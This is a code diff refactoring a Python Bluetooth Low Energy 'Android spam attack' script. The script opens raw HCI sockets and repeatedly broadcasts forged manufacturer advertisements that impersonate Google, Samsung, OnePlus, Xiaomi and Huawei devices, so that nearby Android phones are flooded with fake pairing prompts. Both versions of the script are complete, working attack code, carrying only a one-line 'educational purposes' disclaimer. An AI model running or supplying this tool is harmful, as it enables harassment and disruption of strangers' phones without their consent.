@@ -12,152 +12,101 @@ WARNING: This is for educational purposes only. Use responsibly and only on devi
 you own or have permission to test.
 """
 
-import random
-import bluetooth._bluetooth as bluez
-from time import sleep
-import struct
-import socket
-import array
 import fcntl
+import struct
+import array
+import socket
 import os
 import time
+import sys
 from errno import EALREADY
 import threading
+import random
+import bluetooth._bluetooth as bluez
+from colors import RED, GREEN, BLUE, CYAN, WHITE, YELLOW, RESET, BRIGHT
+
+# Android manufacturer constants
+MANUFACTURERS = {
+    "Google": 0x00E0,
+    "Samsung": 0x0075,
+    "OnePlus": 0x02BE,
+    "Xiaomi": 0x038F,
+    "Huawei": 0x018B,
+}
+
+DEVICE_TYPES = {
+    "Pixel": bytes.fromhex("0A"),
+    "Galaxy": bytes.fromhex("02"),
+    "OneCard": bytes.fromhex("04"),
+    "Mi": bytes.fromhex("06"),
+    "Mate": bytes.fromhex("08"),
+}
+
+ADV_HEADER = bytes([0x02, 0x01, 0x06])
+PREP_DATA = bytes.fromhex("010002000101FF000001")
 
 
-# ANSI Color codes
-RED = "\033[31m"
-GREEN = '\033[32m'
-BLUE = '\033[34m'
-CYAN = '\033[36m'
-WHITE = '\033[37m'
-YELLOW = '\033[33m'
-RESET = "\033[0m"
-BRIGHT = '\033[1m'
-
-
-def decode_hex(string):
-    """Decodes a hex string to bytes."""
-    assert len(string) % 2 == 0, "String must have an even length"
-    return bytes.fromhex(string)
-
-
-def setup_device(device_id):
-    """Setup the Bluetooth device for advertising."""
+def init_hci_device(dev_num):
+    """Initialize HCI device for Bluetooth operations."""
     try:
-        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-        req_str = struct.pack("H", device_id)
-        request = array.array("b", req_str)
-        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
-    except IOError as e:
-        if e.errno != EALREADY:
+        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
+        data = array.array("b", struct.pack("H", dev_num))
+        fcntl.ioctl(s.fileno(), bluez.HCIDEVUP, data[0])
+    except IOError as ie:
+        if ie.errno != EALREADY:
             raise
     finally:
-        hci_sock.close()
+        s.close()
 
 
-def send_packet(sock, device_id):
-    """
-    Send Android device advertisement packet.
-    
-    Uses manufacturer IDs from various Android manufacturers:
-    - Google: 0x00E0
-    - Samsung: 0x0075
-    - OnePlus: 0x02BE
-    - Xiaomi: 0x038F
-    - Huawei: 0x018B
-    """
-    
-    # Android manufacturer IDs
-    android_manufacturers = {
-        "Google": 0x00E0,
-        "Samsung": 0x0075,
-        "OnePlus": 0x02BE,
-        "Xiaomi": 0x038F,
-        "Huawei": 0x018B,
-    }
-    
-    # Device identifiers for Android devices
-    android_devices = {
-        "Pixel": decode_hex("0A"),
-        "Galaxy": decode_hex("02"),
-        "OneCard": decode_hex("04"),
-        "Mi": decode_hex("06"),
-        "Mate": decode_hex("08"),
-    }
-    
-    # Select random manufacturer and device
-    manufacturer_name = random.choice(list(android_manufacturers.keys()))
-    manufacturer_id = android_manufacturers[manufacturer_name]
-    device_type = random.choice(list(android_devices.keys()))
-    device_bytes = android_devices[device_type]
-    
-    print(f'{YELLOW}Broadcasting: {manufacturer_name} {device_type}{RESET}')
-    
-    # Build manufacturer-specific advertisement data
-    prepended_bytes = decode_hex("010002000101FF000001")
-    manufacturer_specific_data = struct.pack('<H', manufacturer_id) + prepended_bytes + device_bytes
-    
-    # Build BLE advertisement packet
-    ad_type_flags = bytes([0x02, 0x01, 0x06])  # Flags: LE General Discoverable Mode
-    manufacturer_data_length = len(manufacturer_specific_data) + 1
-    bt_packet = ad_type_flags + bytes([manufacturer_data_length, 0xFF]) + manufacturer_specific_data
-    
-    # Advertising parameters
-    min_interval = 0x20  # 20ms
-    max_interval = 0x40  # 40ms
-    adv_type = 0x00      # Non-connectable undirected advertising
-    own_addr_type = 0x00  # Public Device Address
-    peer_addr_type = 0x00
-    peer_addr = [0x00] * 6
-    chan_map = 0x07      # All channels
-    filter_policy = 0x00
-    
-    # Send advertising parameters
-    cmd_pkt = struct.pack("<HHBBB6BBB", min_interval, max_interval, adv_type, 
-                         own_addr_type, peer_addr_type, *peer_addr, chan_map, filter_policy)
-    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)  # Set advertising parameters
+def craft_adv_packet(mfg_id, dev_bytes):
+    """Construct BLE advertisement packet payload."""
+    mfg_data = struct.pack('<H', mfg_id) + PREP_DATA + dev_bytes
+    pkt_len = len(mfg_data) + 1
+    return ADV_HEADER + bytes([pkt_len, 0xFF]) + mfg_data
+
+
+def broadcast_adv(socket_obj, packet):
+    """Transmit advertisement packet via HCI."""
+    cfg = struct.pack("<HHBBB6BBB", 0x20, 0x40, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 7, 0)
+    bluez.hci_send_cmd(socket_obj, 0x08, 0x0006, cfg)
     time.sleep(0.03)
     
-    # Enable advertising
-    cmd_pkt = struct.pack("<B", 0x01)
-    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)  # Enable advertising
+    en_pkt = struct.pack("<B", 0x01)
+    bluez.hci_send_cmd(socket_obj, 0x08, 0x000A, en_pkt)
     time.sleep(0.03)
     
-    # Set advertising data
-    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
-    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)  # Set advertising data
+    data_pkt = struct.pack("<B%dB" % len(packet), len(packet), *packet)
+    bluez.hci_send_cmd(socket_obj, 0x08, 0x0008, data_pkt)
     time.sleep(0.03)
 
 
 def android_spam(device_ids, duration=60, interval=1):
     """
-    Main Android spam attack function.
+    Execute Android advertisement spam campaign.
     
     Args:
-        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"])
-        duration (int): Duration of the attack in seconds
-        interval (int): Interval between packets in seconds
+        device_ids (list): HCI device identifiers
+        duration (int): Campaign duration in seconds
+        interval (int): Packet interval in seconds
     """
     
     print(f"{GREEN}{BRIGHT}Android Spam Attack Initiated...{RESET}{BLUE}")
     
-    sockets = []
-    threads = []
+    active_socks = []
     
     try:
-        # Setup all Bluetooth devices
-        for device_id in device_ids:
-            hci_id = int(device_id.replace("hci", ""))
-            print(f"Setting up {device_id}...")
-            setup_device(hci_id)
+        for dev_label in device_ids:
+            dev_num = int(dev_label.replace("hci", ""))
+            print(f"Setting up {dev_label}...")
+            init_hci_device(dev_num)
             try:
-                sock = bluez.hci_open_dev(hci_id)
-                sockets.append((device_id, sock))
-            except Exception as e:
-                print(f"{RED}Unable to connect to Bluetooth hardware {device_id}: {e}{RESET}")
+                sock = bluez.hci_open_dev(dev_num)
+                active_socks.append((dev_label, sock))
+            except Exception as err:
+                print(f"{RED}HCI connection failed on {dev_label}: {err}{RESET}")
         
-        if not sockets:
+        if not active_socks:
             print(f"{RED}No Bluetooth devices available!{RESET}")
             return
         
@@ -165,43 +114,41 @@ def android_spam(device_ids, duration=60, interval=1):
         print(f"{CYAN}Broadcasting Android advertisements...{RESET}")
         print(f"{YELLOW}Duration: {duration} seconds{RESET}\n")
         
-        start_time = time.time()
-        packet_count = 0
+        elapsed_time = time.time()
+        sent_count = 0
         
-        # Send packets for specified duration
-        while time.time() - start_time < duration:
-            for device_label, sock in sockets:
+        while time.time() - elapsed_time < duration:
+            mfr = random.choice(list(MANUFACTURERS.keys()))
+            dev = random.choice(list(DEVICE_TYPES.keys()))
+            
+            pkt = craft_adv_packet(MANUFACTURERS[mfr], DEVICE_TYPES[dev])
+            
+            for _, sock in active_socks:
                 try:
-                    send_packet(sock, int(device_label.replace("hci", "")))
-                    packet_count += 1
-                except Exception as e:
-                    print(f"{RED}Error sending packet on {device_label}: {e}{RESET}")
+                    broadcast_adv(sock, pkt)
+                    sent_count += 1
+                    print(f'{YELLOW}[{mfr}] {dev}{RESET}')
+                except Exception as err:
+                    print(f"{RED}Transmission error: {err}{RESET}")
             
             time.sleep(interval)
         
-        print(f"\n{GREEN}Attack completed!{RESET}")
-        print(f"{CYAN}Packets sent: {packet_count}{RESET}")
+        print(f"\n{GREEN}Campaign complete!{RESET}")
+        print(f"{CYAN}Total transmissions: {sent_count}{RESET}")
         
     except KeyboardInterrupt:
-        print(f"\n{YELLOW}Attack interrupted by user{RESET}")
-    except Exception as e:
-        print(f"{RED}An error occurred: {e}{RESET}")
+        print(f"\n{YELLOW}Operation ceased by user{RESET}")
+    except Exception as err:
+        print(f"{RED}Fatal error: {err}{RESET}")
     finally:
-        # Close all sockets
-        for device_label, sock in sockets:
+        for _, sock in active_socks:
             try:
                 sock.close()
             except:
                 pass
-        
-        print(f"{BLUE}Cleaned up resources.{RESET}")
+        print(f"{BLUE}Resources released.{RESET}")
 
 
 if __name__ == "__main__":
-    # For testing: run with default parameters
-    import sys
-    devices = ["hci0"]
-    if len(sys.argv) > 1:
-        devices = sys.argv[1:]
-    
-    android_spam(device_ids=devices, duration=60, interval=1)
+    devs = sys.argv[1:] if len(sys.argv) > 1 else ["hci0"]
+    android_spam(device_ids=devs, duration=60, interval=1)
